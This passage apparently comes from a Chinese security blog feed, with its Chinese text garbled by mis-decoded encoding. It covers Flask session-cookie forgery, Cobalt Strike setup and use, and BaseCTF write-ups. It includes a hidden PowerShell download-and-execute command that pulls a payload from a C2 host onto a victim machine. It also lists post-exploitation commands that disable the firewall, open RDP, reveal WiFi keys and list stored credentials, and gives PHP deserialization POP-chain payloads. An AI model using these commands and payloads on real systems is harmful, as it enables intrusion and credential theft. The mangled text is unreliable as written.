ï¼Œjwt</p><p>ä½¿ç”¨å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a></p><p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·</p><p>æŠ“åŒ…ï¼šè®¿é—®&#x2F;getFlag</p><p><img src="/img/image-20240920105914385.png" alt="image-20240920105914385"></p><p><img src="/img/image-20240920110101258.png" alt="image-20240920110101258"></p><p>æå–sessionå€¼</p><p>.eJwlzjEOwzAIQNG7eO6AAWPIZSJjsNo1aaaqd2-kjl_6w_uUfR15Psv2Pq58lP0VZSuC5Gsmtt4xMCOl1xhZHWtt6jLdnSUYUj0npw6JWEbWpDYcpnFvAGQO1IXrnL3nUEQU6oPuEhFuKIq2KjuBNGOdYJA5KMoNuc48_hos3x-4sS5U.Zuzjow.09lgm1OqoVaAVLe76LXT-TkqWnA</p><p>kaliè‡ªå¸¦pythonæ¨¡å—è¾ƒä¸ºå®Œå–„ï¼Œå¯ä»¥åœ¨kalié‡Œé¢è¿è¡Œ</p><p><img src="/img/image-20240920111524083.png" alt="image-20240920111524083"></p><p>é‡æ–°æ³¨å†Œä¸€ä¸‹è·å¾—çš„ç¬¬äºŒä¸ªsessionå€¼ç»è¿‡ä¼ªé€ åå¯ä»¥çŒœæµ‹å…¶idå€¼ä¸º3ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§èƒ†çŒœæµ‹adminçš„idå€¼ä¸º1</p><p>åŸå§‹æ•°æ®ï¼š</p><p>â€˜{â€œ_freshâ€:true,â€_idâ€:â€623bfce25772d2ede671dae1b21158b6cbbb46d40e8bec4e8a6ddf93956152a98d1580039b037641cc77ea8222637a3c776664526829f14b3065948c090eea3dâ€,â€_user_idâ€:â€2â€}â€™</p><p>å°å†™tå˜æˆT ,id:ååŠ ä¸ªç©ºæ ¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p>ä¿®æ”¹æ•°æ®ï¼š</p><p>â€œ{â€˜_freshâ€™:True, â€˜_idâ€™: â€˜623bfce25772d2ede671dae1b21158b6cbbb46d40e8bec4e8a6ddf93956152a98d1580039b037641cc77ea8222637a3c776664526829f14b3065948c090eea3dâ€™, â€˜_user_idâ€™: â€˜1â€™}â€</p><p>F12æŸ¥çœ‹åˆ°å¯†ç ä¸ºï¼šth3f1askisfunny</p><p><img src="/img/image-20240920114313425.png" alt="image-20240920114313425"></p><p><img src="/img/image-20240920112609288.png" alt="image-20240920112609288"></p><p>ä¿®æ”¹sessionå€¼è·å–flag</p><p><img src="/img/image-20240920112540806.png" alt="image-20240920112540806"></p><p>NSSCTF{216857c5-8aaa-4cfe-9990-4081f74efb4e}</p><h3 id="NSSRound-13-Basic-flask-jwt-hard"><a href="#NSSRound-13-Basic-flask-jwt-hard" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?(hard)"></a>[NSSRound#13 Basic]flask?jwt?(hard)</h3><p>ç¬¬ä¸€é¢˜çš„proç‰ˆï¼ŒåŒºåˆ«åœ¨äºå¼€ä¸ªdebugæ¥æ‰¾åˆ°å¯†é’¥ï¼Œå…¶ä»–å½¢å¼å’Œç¬¬ä¸€é¢˜æ— åŒºåˆ«ï¼Œæ³¨å†Œè®¿é—®&#x2F;worè·¯ç”±å³å¯æ‹¿åˆ°æœ¬é¢˜æ‰€éœ€è¦çš„å¯†é’¥</p><p><img src="/img/image-20240920201459394.png" alt="image-20240920201459394"></p><p>è®¿é—®å…¶&#x2F;worè·¯ç”±ï¼Œç»™å‡ºä¸€ä¸ªæ—¶é—´ï¼Œå¯çŸ¥sessioné‡ŒåŒ…å«timeï¼Œæˆ‘ä»¬å°è¯•ä¿®æ”¹sessionçš„å€¼ï¼Œè·å–keyçš„å€¼ï¼Œçœ¼ç›ä¸å¥½å¯ä»¥å¤åˆ¶åˆ°è®°äº‹æœ¬é‡Œçœ‹ï¼šhardgam3_C0u1d_u_f1ndM3????</p><p><img src="/img/image-20240920203659645.png" alt="image-20240920203659645"></p><p><img src="/img/image-20240920203837691.png" alt="image-20240920203837691"></p><p>æ‰¾åˆ°å¯†é’¥ä¹‹åå°±åƒç¬¬ä¸€é¢˜ä¸€æ ·è§£å†³ä¹‹åå°±è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="cobaltStrike4-3å®‰è£…"><a href="#cobaltStrike4-3å®‰è£…" class="headerlink" title="cobaltStrike4.3å®‰è£…"></a>cobaltStrike4.3å®‰è£…</h2><p>å“ï¼Œè£…ä¸ª4.0çš„ç‰ˆæœ¬è¿˜æ˜¯ä¸è¡Œï¼Œjdkç‰ˆæœ¬æ˜¯11çš„</p><p>ç™¾åº¦ç½‘ç›˜ï¼š<a href="https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w">https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w</a> æå–ç : n1qm </p><p>kalié‡Œé¢è§£å‹ç¼©ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.23.152 123456    #kaliçš„ipåœ°å€ï¼Œå¯†ç ï¼š123456[ä¸€æ¬¡æ€§çš„ï¼Œå¯ä»¥éšæ—¶æ›´æ”¹]</span><br></pre></td></tr></table></figure><p><img src="/img/1726147569177-31.png" alt="img"></p><p>windowsä¸‹å¯åŠ¨</p><p><img src="/img/1726147569175-1.png" alt="img"></p><p>æˆåŠŸè¿æ¥</p><p><img src="/img/1726147569175-2.png" alt="img"></p><h2 id="cobaltStrikeåŸºæœ¬ä½¿ç”¨"><a href="#cobaltStrikeåŸºæœ¬ä½¿ç”¨" class="headerlink" title="cobaltStrikeåŸºæœ¬ä½¿ç”¨"></a>cobaltStrikeåŸºæœ¬ä½¿ç”¨</h2><p>å‡†å¤‡ä¸€å°è‚‰é¸¡ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨windows7æ¥æµ‹è¯•ï¼Œå“ï¼Œwindows10å¥½å¡</p><p>csä¸Š</p><p><img src="/img/1726147569175-3.png" alt="img"></p><p>å¡«å†™ä¸»æœºçš„ipåœ°å€ï¼Œå¼€å¯ç›‘å¬å³å¯</p><p><img src="/img/1726147569175-4.png" alt="img"></p><p>window7ä¸Šè¾“å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.5.48:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸï¼Œè¾“å…¥shell whoamiæ¥æ‰§è¡Œä¸€ä¸‹</p><p><img src="/img/1726147569175-5.png" alt="img"></p><h2 id="ä½¿ç”¨CSè¿›è¡Œæœ¬åœ°å·¥ä½œç»„æ”¶é›†ä¿¡æ¯"><a href="#ä½¿ç”¨CSè¿›è¡Œæœ¬åœ°å·¥ä½œç»„æ”¶é›†ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨CSè¿›è¡Œæœ¬åœ°å·¥ä½œç»„æ”¶é›†ä¿¡æ¯"></a>ä½¿ç”¨CSè¿›è¡Œæœ¬åœ°å·¥ä½œç»„æ”¶é›†ä¿¡æ¯</h2><p>Shell ipconfig,å¯ä»¥æŸ¥çœ‹åˆ°å…¶ipåœ°å€</p><p><img src="/img/1726147569175-6.png" alt="img"></p><p>shell systeminfo</p><p><img src="/img/1726147569175-7.png" alt="img"></p><p>æŸ¥çœ‹ç³»ç»Ÿç»“æ„ä½“ç³»ç»“æ„</p><p>echo %PROCESSOR_ARCHITECTURE%</p><p><img src="/img/1726147569175-8.png" alt="img"></p><p>æŸ¥çœ‹ç³»ç»Ÿå®‰è£…äº†å“ªäº›è½¯ä»¶åŠç‰ˆæœ¬ï¼šwmic product get name,version</p><p><img src="/img/1726147569176-9.png" alt="img"></p><p>æœ¬æœºè¿è¡ŒæœåŠ¡ï¼šwmic service list brief</p><p><img src="/img/1726147569176-10.png" alt="img"></p><p>æŸ¥çœ‹è¿›ç¨‹:tasklist</p><p><img src="/img/1726147569176-11.png" alt="img"></p><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼šschtasks &#x2F;query &#x2F;fo LIST &#x2F;v  [å¦‚æœæŠ¥é”™çš„è¯å¯ä»¥å…ˆè¾“å…¥chcp473æ”¹å˜å…¶ç¼–ç ]</p><p><img src="/img/1726147569176-12.png" alt="img"></p><p>ç”µè„‘å¼€æœºæ—¶é—´ï¼šnet statistics workstation</p><p><img src="/img/1726147569176-13.png" alt="img"></p><p>æŸ¥çœ‹æœ¬åœ°æœ‰å‡ ä¸ªç”¨æˆ·ï¼šnet user</p><p><img src="/img/1726147569176-14.png" alt="img"></p><p>å½“å‰ä¼šè¯åˆ—è¡¨ï¼šnet session</p><p><img src="/img/1726147569176-15.png" alt="img"></p><p>æŸ¥è¯¢ç«¯å£å¼€æ”¾ä¿¡æ¯ï¼š netstat -ano</p><p><img src="/img/1726147569176-16.png" alt="img"></p><p>æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯ï¼šä¾æ—§å¯ä»¥ä½¿ç”¨shell systeminfoæ¥æŸ¥çœ‹</p><p><img src="/img/1726147569176-17.png" alt="img"></p><p>æŸ¥çœ‹æ€æ¯’è½¯ä»¶ä¿¡æ¯ï¼šwmic &#x2F;namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExeï¼Œç›®æ ‡é¶æœºæ²¡æœ‰æ€æ¯’è½¯ä»¶ï¼Œå°±ä»¥æˆ‘çš„ä¸»æœºä¸ºä¾‹</p><p><img src="/img/1726147569176-18.png" alt="img"></p><p>æŸ¥è¯¢å…±äº«åˆ—è¡¨ï¼šnet share</p><p><img src="/img/1726147569176-19.png" alt="img"></p><p>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ï¼šroute print</p><p><img src="/img/1726147569176-20.png" alt="img"></p><p>æŸ¥çœ‹é˜²ç«å¢™çš„ç¦ç”¨çŠ¶æ€ï¼šnetsh firewall show state</p><p><img src="/img/1726147569176-21.png" alt="img"></p><p>å…³é—­é˜²ç«å¢™çš„å‘½ä»¤</p><p>Netsh firewall set opmode  disable</p><p><img src="/img/1726147569176-22.png" alt="img"></p><p>é˜²ç«å¢™å…è®¸3389ç«¯å£æ”¾è¡Œ</p><p>netsh firewall set portopening TCP 3389 ENABLE</p><p><img src="/img/1726147569176-23.png" alt="img"></p><p>æŸ¥çœ‹å½“å‰è¿æ¥wifiå¯†ç åå­—</p><p>netsh wlan show profile name&#x3D;â€HYNUCTF520â€ key&#x3D;clear</p><p><img src="/img/1726147569176-24.png" alt="img"></p><p>æŸ¥çœ‹rdpç«¯å£</p><p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer\WinStations\RDP-Tcp &#x2F;v PortNumber    #16è¿›åˆ¶è½¬10è¿›åˆ¶ä¸º3389</p><p><img src="/img/1726147569176-25.png" alt="img"></p><p>æŸ¥çœ‹å½“å‰å‡­æ®</p><p>cmdkey &#x2F;l</p><p><img src="/img/1726147569176-26.png" alt="img"></p><p>æŸ¥çœ‹å±€åŸŸç½‘æ‰€æœ‰IPä¿¡æ¯</p><p>Arp-a </p><p><img src="/img/1726147569176-27.png" alt="img"></p><p>æŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶</p><p>Dir %appdata%\Microsoft\Windows\Recent</p><p><img src="/img/1726147569177-28.png" alt="img"></p><p>æŸ¥çœ‹æœ¬åœ°å·¥ä½œç»„</p><p>Net localgroup</p><p><img src="/img/1726147569177-29.png" alt="img"></p><p>æŸ¥çœ‹æœ¬åœ°å·¥ä½œç»„users</p><p>Net localgroup users</p><p><img src="/img/1726147569177-30.png" alt="img"></p><p>æŸ¥çœ‹rdpçš„ä¿å­˜å‡­æ®</p><p>dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials*</p><p><img src="/img/image-20240913084522181.png" alt="image-20240913084522181"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF</title>
      <link href="/2024/09/04/BaseCTF/"/>
      <url>/2024/09/04/BaseCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-crypto"><a href="#ez-crypto" class="headerlink" title="ez_crypto"></a>ez_crypto</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qMfZzunurNTuAdfZxZfZxZrUx2v6x2i0C2u2ngrLyZbKzx0=</span><br></pre></td></tr></table></figure><p>base64æ¢è¡¨</p><p><img src="/img/1725763539191-10.png" alt="img"></p><h3 id="é»‘ä¸ä¸Šçš„flag"><a href="#é»‘ä¸ä¸Šçš„flag" class="headerlink" title="é»‘ä¸ä¸Šçš„flag"></a>é»‘ä¸ä¸Šçš„flag</h3><p>stegsolveæŸ¥çœ‹é€šé“</p><p><img src="/img/1725763539177-1.png" alt="img"></p><h3 id="è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…"><a href="#è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…"></a>è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…</h3><p>å‹ç¼©åŒ…çˆ†ç ´è§£å¯†ï¼Œæ³¨é‡Šé‡Œçš„ä¸€æ®µbaseè§£å¯†ï¼š</p><p>QmFzZUNURj8&#x2F;Pz8&#x2F;P0ZUQ2VzYUI&#x3D;</p><p>BaseCTF??????FTCesaB</p><p>ARCHPRçˆ†ç ´æ— è§£ï¼Œç»è§‚å¯Ÿå¯çŸ¥è¿™ä¸ªå¯†ç å‘ˆå¯¹ç§°æ€§</p><p>è„šæœ¬ç›´æ¥çˆ†ç ´è§£å¯†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lowercase = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">uppercase = lowercase.upper()</span><br><span class="line">digits = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">symbols = <span class="string">&#x27;!@#$%^&amp;*()-_=+&#x27;</span></span><br><span class="line">ls = lowercase+uppercase+digits+symbols</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> t1 <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">for</span> t2 <span class="keyword">in</span> ls:</span><br><span class="line">            <span class="keyword">for</span> t3 <span class="keyword">in</span> ls:</span><br><span class="line">                password = <span class="string">&#x27;BaseCTF&#x27;</span>+t1+t2+t3+t3+t2+t1+<span class="string">&#x27;FTCesaB&#x27;</span></span><br><span class="line">                f.write(password+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-2.png" alt="img"></p><p>BaseCTF_h11h_FTCesaB</p><p>BaseCTF{a7da6763-5013-4963-9c23-8fb3d049bdce}</p><h3 id="Base-revenge"><a href="#Base-revenge" class="headerlink" title="Base revenge"></a>Base revenge</h3><p>base64éšå†™-&gt;JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9</p><p><img src="/img/1725763539178-3.png" alt="img"></p><p>æ ¹æ®æç¤ºï¼šAtbash</p><p><img src="/img/1725763539178-4.png" alt="img"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>; <span class="comment">#3.è§¦å‘_tostring()é­”æœ¯æ–¹æ³•</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;  <span class="comment">#4.è§¦å‘_wakeupé­”æœ¯æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();         <span class="comment">#2.è§¦å‘_geté­”æœ¯æ–¹æ³•ï¼Œæ¥è°ƒç”¨getflag(),å½“è®¿è¯¥ç±»ä¸­ç§æœ‰æˆ–è€…ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§å€¼æ—¶è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);      <span class="comment"># 1.æ‰¾åˆ°è¾“å‡ºflagçš„ä½ç½®ï¼Œæ‰§è¡Œcat /flagï¼Œè¿™é‡Œæˆ‘ä»¬è¦è°ƒç”¨getflag()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">misc</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; over = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; chu0 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> =<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$d</span> -&gt; kw = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;N;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>nature&#x3D;O:6:â€Natureâ€:1:{s:3:â€seaâ€;O:3:â€Seaâ€:1:{s:6:â€animalâ€;O:5:â€Sharkâ€:1:{s:6:â€%00word%00â€;O:4:â€Sinkâ€:1:{s:9:â€%00Sink%00cmdâ€;s:9:â€echo 123;â€;}}}}</p><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><p>phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span 